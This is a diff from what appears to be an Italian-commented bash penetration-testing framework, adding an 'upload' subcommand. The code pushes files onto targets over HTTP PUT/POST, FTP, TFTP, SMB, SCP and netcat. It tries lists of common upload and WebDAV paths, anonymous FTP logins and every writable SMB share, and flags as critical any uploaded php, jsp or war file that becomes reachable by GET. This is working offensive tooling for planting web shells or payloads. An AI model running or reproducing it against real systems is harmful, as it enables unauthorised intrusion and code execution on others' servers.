+            tcp)   port=9999;;
+        esac
+        log "  Porta default per $proto: $port"
+    fi
+
+    [[ $DRY_RUN -eq 0 ]] && echo "$proto:$port:$local_file:$fmd5" > "$OUTDIR/upload_session.txt" || true
+
+    # ════════════════════════════════════════════════════════
+    #  HTTP / HTTPS
+    # ════════════════════════════════════════════════════════
+    if [[ "$proto" == "http" || "$proto" == "https" ]]; then
+        local base_url="${proto}://${target}:${port}"
+        local curl_base=(-s --connect-timeout 8 -m 30)
+        [[ "$no_verify" -eq 1 ]] && curl_base+=(-k)
+        [[ -n "$user" && -n "$pass" ]] && curl_base+=(-u "${user}:${pass}")
+
+        # Percorso remoto di default
+        if [[ -z "$remote_path" ]]; then
+            case "$fext" in
+                php)  remote_path="/uploads/${fname}" ;;
+                jsp|war) remote_path="/uploads/${fname}" ;;
+                sh|py|pl|rb) remote_path="/uploads/${fname}" ;;
+                *)    remote_path="/${fname}" ;;
+            esac
+        fi
+
+        # Sceglie metodo HTTP se auto
+        if [[ "$http_method" == "auto" ]]; then
+            case "$fext" in
+                war|jar) http_method="put"  ;;
+                *)       http_method="put"  ;;
+            esac
+        fi
+
+        section "HTTP Upload — ${http_method^^} ${base_url}${remote_path}"
+
+        case "$http_method" in
+            # ── PUT ─────────────────────────────────────────
+            put|webdav)
+                run_cmd "http_put" \
+                    "curl ${curl_base[*]} -X PUT \
+                     -H 'Content-Type: application/octet-stream' \
+                     --data-binary '@${local_file}' \
+                     -o '${OUTDIR}/put_response.txt' -w '%{http_code}' \
+                     '${base_url}${remote_path}' 2>&1 | tee '${OUTDIR}/put_status.txt'"
+                if [[ $DRY_RUN -eq 0 ]]; then
+                    local put_code; put_code=$(cat "$OUTDIR/put_status.txt" 2>/dev/null | tr -d '[:space:]' | tail -c 3)
+                    if [[ "$put_code" =~ ^(200|201|204)$ ]]; then
+                        found HIGH "UPLOAD HTTP PUT — $fname caricato con successo: ${base_url}${remote_path} (HTTP $put_code)"
+                        log "  Verifica accesso GET..."
+                        local verify_code; verify_code=$(_upload_http_verify "$base_url" "$remote_path" "$no_verify")
+                        [[ "$verify_code" == "200" ]] && \
+                            found CRITICAL "UPLOAD HTTP — file raggiungibile via GET: ${base_url}${remote_path}"
+                    else
+                        log "  PUT risposta: HTTP $put_code — provo percorsi alternativi"
+                        # Percorsi alternativi comuni
+                        local _alt_paths=("/upload/${fname}" "/uploads/${fname}"
+                                          "/cgi-bin/${fname}" "/webdav/${fname}"
+                                          "/dav/${fname}" "/files/${fname}"
+                                          "/www/${fname}" "/htdocs/${fname}")
+                        for _apath in "${_alt_paths[@]}"; do
+                            local _alt_code
+                            _alt_code=$(curl "${curl_base[@]}" -X PUT \
+                                -H 'Content-Type: application/octet-stream' \
+                                --data-binary "@${local_file}" \
+                                -o /dev/null -w "%{http_code}" \
+                                "${base_url}${_apath}" 2>/dev/null || echo "000")
+                            if [[ "$_alt_code" =~ ^(200|201|204)$ ]]; then
+                                found HIGH "UPLOAD HTTP PUT — $fname caricato: ${base_url}${_apath} (HTTP $_alt_code)"
+                                remote_path="$_apath"
+                                local _vc; _vc=$(_upload_http_verify "$base_url" "$_apath" "$no_verify")
+                                [[ "$_vc" == "200" ]] && \
+                                    found CRITICAL "UPLOAD HTTP — file raggiungibile via GET: ${base_url}${_apath}"
+                                break
+                            fi
+                        done
+                    fi
+                fi
+                ;;
+
+            # ── POST multipart ───────────────────────────────
+            post)
+                # Endpoint di upload comuni
+                local _post_endpoints=("/upload" "/uploads" "/api/upload"
+                                       "/admin/upload" "/file/upload"
+                                       "/cgi-bin/upload.cgi" "/fileupload"
+                                       "/api/v1/upload" "/media/upload"
+                                       "/backup" "/restore")
+                for _ep in "${_post_endpoints[@]}"; do
+                    run_cmd "http_post_${_ep//\//_}" \
+                        "curl ${curl_base[*]} -X POST \
+                         -F 'file=@${local_file}' -F 'filename=${fname}' \
+                         -o '${OUTDIR}/post_response_${_ep//\//_}.txt' -w '%{http_code}' \
+                         '${base_url}${_ep}' 2>&1 | tee '${OUTDIR}/post_status_${_ep//\//_}.txt'"
+                    if [[ $DRY_RUN -eq 0 ]]; then
+                        local _pc; _pc=$(cat "${OUTDIR}/post_status_${_ep//\//_}.txt" 2>/dev/null | tr -d '[:space:]' | tail -c 3)
+                        if [[ "$_pc" =~ ^(200|201)$ ]]; then
+                            found HIGH "UPLOAD HTTP POST — $fname caricato su ${base_url}${_ep} (HTTP $_pc)"
+                            # Prova GET sul path
+                            local _gv; _gv=$(_upload_http_verify "$base_url" "${_ep}/${fname}" "$no_verify")
+                            [[ "$_gv" == "200" ]] && \
+                                found CRITICAL "UPLOAD HTTP — file eseguibile via GET: ${base_url}${_ep}/${fname}"
+                            break
+                        fi
+                        log "  POST ${_ep}: HTTP $_pc"
+                    fi
+                done
+                ;;
+        esac
+
+        ok "HTTP upload completato → $OUTDIR"
+        return
+    fi
+
+    # ════════════════════════════════════════════════════════
+    #  FTP
+    # ════════════════════════════════════════════════════════
+    if [[ "$proto" == "ftp" ]]; then
+        section "FTP Upload (porta $port)"
+        local ftp_rpath="${remote_path:-/${fname}}"
+        local ftp_user="${user:-anonymous}" ftp_pass="${pass:-anonymous}"
+
+        # Tenta prima upload anonimo, poi con credenziali
+        local _ftp_attempts=()
+        _ftp_attempts+=("anonymous:anonymous:${ftp_rpath}")
+        _ftp_attempts+=("anonymous::${ftp_rpath}")
+        [[ -n "$user" ]] && _ftp_attempts+=("${user}:${pass}:${ftp_rpath}")
+
+        for _fa in "${_ftp_attempts[@]}"; do
+            local _fu _ftmp _fp _frp
+            _fu="${_fa%%:*}"
+            _ftmp="${_fa#*:}"
+            _fp="${_ftmp%%:*}"
+            _frp="${_ftmp#*:}"
+            log "  Tentativo FTP upload: ${_fu}@${target}:${port}${_frp}"
+            run_cmd "ftp_upload_${_fu}" \
+                "curl -s --connect-timeout 8 -m 30 \
+                 -T '${local_file}' \
+                 'ftp://${_fu}:${_fp}@${target}:${port}${_frp}' \
+                 -o '${OUTDIR}/ftp_upload_${_fu}.txt' -w '%{http_code}' 2>&1 | \
+                 tee '${OUTDIR}/ftp_status_${_fu}.txt'"
+            if [[ $DRY_RUN -eq 0 ]]; then
+                local _ftpc; _ftpc=$(cat "${OUTDIR}/ftp_status_${_fu}.txt" 2>/dev/null | tr -d '[:space:]' | tail -c 3)
+                if [[ "$_ftpc" =~ ^(2[0-9][0-9])$ ]] || \
+                   grep -qi "Transfer complete\|226\|stor\|250" "${OUTDIR}/ftp_upload_${_fu}.txt" 2>/dev/null; then
+                    found HIGH "UPLOAD FTP — $fname caricato su ${target}:${port}${_frp} (user: ${_fu})"
+                    break
+                else
+                    log "  FTP upload fallito (HTTP code: $_ftpc)"
+                fi
+            fi
+        done
+
+        # Verifica con listing FTP
+        if [[ $DRY_RUN -eq 0 ]]; then
+            run_cmd "ftp_list" \
+                "curl -s --connect-timeout 5 -m 10 \
+                 'ftp://${ftp_user}:${ftp_pass}@${target}:${port}/' \
+                 -o '${OUTDIR}/ftp_listing.txt' 2>&1"
+            if grep -q "$fname" "${OUTDIR}/ftp_listing.txt" 2>/dev/null; then
+                found MEDIUM "UPLOAD FTP — $fname presente nel listing FTP root"
+            fi
+        fi
+
+        ok "FTP upload completato → $OUTDIR"
+        return
+    fi
+
+    # ════════════════════════════════════════════════════════
+    #  TFTP
+    # ════════════════════════════════════════════════════════
+    if [[ "$proto" == "tftp" ]]; then
+        section "TFTP Upload (porta $port)"
+        local tftp_rpath="${remote_path:-${fname}}"
+        if require_tool atftp; then
+            run_cmd "tftp_put" \
+                "atftp --put --local-file '${local_file}' \
+                 --remote-file '${tftp_rpath}' \
+                 ${target} ${port} 2>&1 | tee '${OUTDIR}/tftp_upload.txt'"
+            if [[ $DRY_RUN -eq 0 ]]; then
+                if ! grep -qi "error\|timeout\|fail" "${OUTDIR}/tftp_upload.txt" 2>/dev/null; then
+                    found HIGH "UPLOAD TFTP — $fname inviato a ${target}:${port}/${tftp_rpath}"
+                    # Verifica GET
+                    run_cmd "tftp_get_verify" \
+                        "atftp --get --remote-file '${tftp_rpath}' \
+                         --local-file '${OUTDIR}/tftp_verify_${fname}' \
+                         ${target} ${port} 2>&1"
+                    if [[ -f "${OUTDIR}/tftp_verify_${fname}" ]]; then
+                        local vmd5; vmd5=$(md5sum "${OUTDIR}/tftp_verify_${fname}" 2>/dev/null | awk '{print $1}' || true)
+                        if [[ "$vmd5" == "$fmd5" ]]; then
+                            found CRITICAL "UPLOAD TFTP — file verificato (MD5 ok): ${target}:${port}/${tftp_rpath}"
+                        else
+                            found MEDIUM "UPLOAD TFTP — file recuperato ma MD5 diverso (corruzione?)"
+                        fi
+                    fi
+                else
+                    warn "TFTP upload fallito — vedi ${OUTDIR}/tftp_upload.txt"
+                fi
+            fi
+        fi
+        ok "TFTP upload completato → $OUTDIR"
+        return
+    fi
+
+    # ════════════════════════════════════════════════════════
+    #  SMB
+    # ════════════════════════════════════════════════════════
+    if [[ "$proto" == "smb" ]]; then
+        section "SMB Upload (porta $port)"
+        local smb_user="${user:-}" smb_pass="${pass:-}"
+        local smb_rpath="${remote_path:-${fname}}"
+        local smb_creds=""
+        if [[ -n "$smb_user" ]]; then
+            smb_creds="-U '${smb_user}%${smb_pass}'"
+        else
+            smb_creds="-N"
+        fi
+
+        # Elenca share accessibili
+        run_cmd "smb_list_shares" \
+            "smbclient -L '//${target}' ${smb_creds} -p ${port} 2>&1 | tee '${OUTDIR}/smb_shares.txt'"
+
+        if [[ $DRY_RUN -eq 0 && -f "${OUTDIR}/smb_shares.txt" ]]; then
+            # Cerca share scrivibili (escludi stampa e IPC$)
+            local _writable_shares=()
+            while IFS= read -r _sline; do
+                local _sname; _sname=$(echo "$_sline" | awk '{print $1}')
+                [[ -z "$_sname" || "$_sname" =~ ^(IPC\$|print\$|ADMIN\$)$ ]] && continue
+                # Test scrittura con put
+                local _test_resp
+                _test_resp=$(smbclient "//${target}/${_sname}" ${smb_creds} -p "${port}" \
+                    -c "put '${local_file}' '${smb_rpath}'" 2>&1 || true)
+                if ! echo "$_test_resp" | grep -qi "NT_STATUS_ACCESS_DENIED\|NT_STATUS_LOGON_FAILURE\|error"; then
+                    _writable_shares+=("$_sname")
+                    found HIGH "UPLOAD SMB — $fname caricato su \\\\${target}\\${_sname}\\${smb_rpath}"
+                    echo "$_test_resp" >> "${OUTDIR}/smb_upload_${_sname}.txt"
+                fi
+            done < <(grep -iE "Disk|Printer" "${OUTDIR}/smb_shares.txt" 2>/dev/null || true)
+
+            if [[ ${#_writable_shares[@]} -eq 0 ]]; then
+                log "  Nessuna share SMB scrivibile trovata"
+            fi
+        fi
+
+        ok "SMB upload completato → $OUTDIR"
+        return
+    fi
+
+    # ════════════════════════════════════════════════════════
+    #  SSH / SCP
+    # ════════════════════════════════════════════════════════
+    if [[ "$proto" == "ssh" ]]; then
+        section "SSH/SCP Upload (porta $port)"
+        [[ -z "$user" ]] && { err "--user obbligatorio per SSH/SCP"; exit 1; }
+        local scp_rpath="${remote_path:-/tmp/${fname}}"
+        local scp_opts=(-o StrictHostKeyChecking=no -o ConnectTimeout=8 -P "$port")
+
+        if require_tool scp; then
+            local scp_cmd
+            if [[ -n "$pass" ]] && command -v sshpass &>/dev/null; then
+                scp_cmd="sshpass -p '${pass}' scp ${scp_opts[*]} '${local_file}' '${user}@${target}:${scp_rpath}'"
+            elif [[ -n "$pass" ]]; then
+                warn "sshpass non trovato — upload SSH potrebbe richiedere password interattiva"
+                scp_cmd="scp ${scp_opts[*]} '${local_file}' '${user}@${target}:${scp_rpath}'"
+            else
+                # Chiave SSH (no password)
+                scp_cmd="scp ${scp_opts[*]} '${local_file}' '${user}@${target}:${scp_rpath}'"
+            fi
+
+            run_cmd "scp_upload" "$scp_cmd 2>&1 | tee '${OUTDIR}/scp_upload.txt'"
+
+            if [[ $DRY_RUN -eq 0 ]]; then
+                if ! grep -qi "error\|denied\|fail\|No such" "${OUTDIR}/scp_upload.txt" 2>/dev/null; then
+                    found HIGH "UPLOAD SSH/SCP — $fname caricato su ${user}@${target}:${scp_rpath}"
+                    # Verifica MD5 remoto via SSH
+                    local md5_cmd="md5sum '${scp_rpath}' 2>/dev/null | awk '{print \$1}'"
+                    local remote_md5=""
+                    if [[ -n "$pass" ]] && command -v sshpass &>/dev/null; then
+                        remote_md5=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
+                            -p "$port" "${user}@${target}" "$md5_cmd" 2>/dev/null || true)
+                    fi
+                    if [[ -n "$remote_md5" && "$remote_md5" == "$fmd5" ]]; then
+                        found MEDIUM "UPLOAD SSH — MD5 verificato sul target: $scp_rpath"
+                    elif [[ -n "$remote_md5" ]]; then
+                        warn "MD5 remoto ($remote_md5) ≠ locale ($fmd5) — possibile corruzione"
+                    fi
+                else
+                    warn "SCP upload fallito — vedi ${OUTDIR}/scp_upload.txt"
+                fi
+            fi
+        fi
+
+        ok "SSH/SCP upload completato → $OUTDIR"
+        return
+    fi
+
+    # ════════════════════════════════════════════════════════
+    #  TCP raw (netcat)
+    # ════════════════════════════════════════════════════════
+    if [[ "$proto" == "tcp" ]]; then
+        section "TCP raw Upload (porta $port)"
+        warn "TCP raw: il target deve essere in ascolto con nc -lvp ${port} > file"
+
+        if require_tool nc; then
+            run_cmd "tcp_send" \
+                "nc -w 5 '${target}' '${port}' < '${local_file}' 2>&1 | tee '${OUTDIR}/tcp_upload.txt'"
+            if [[ $DRY_RUN -eq 0 ]]; then
+                if ! grep -qi "refused\|timeout\|error" "${OUTDIR}/tcp_upload.txt" 2>/dev/null; then
+                    found MEDIUM "UPLOAD TCP raw — $fname inviato a ${target}:${port} ($fsize byte)"
+                else
+                    warn "TCP raw fallito — porta chiusa o target non in ascolto"
+                fi
+            fi
+        fi
+
+        ok "TCP raw upload completato → $OUTDIR"
+        return
+    fi
+
+    err "Protocollo non supportato: $proto"
+    exit 1
+}
+
 # Carica configurazione utente e plugin
 _load_config
 declare -A EXA_PLUGIN_CMDS 2>/dev/null || true
@@ -18928,6 +20913,7 @@ case "$subcommand" in
     redis)   cmd_redis   "$@" ;;
     http)    cmd_http    "$@" ;;
     post)    cmd_post    "$@" ;;
+    upload)  cmd_upload  "$@" ;;
     fw)      cmd_fw      "$@" ;;
     auto)           cmd_auto          "$@" ;;
     pipeline)       cmd_pipeline      "${@}" ;;
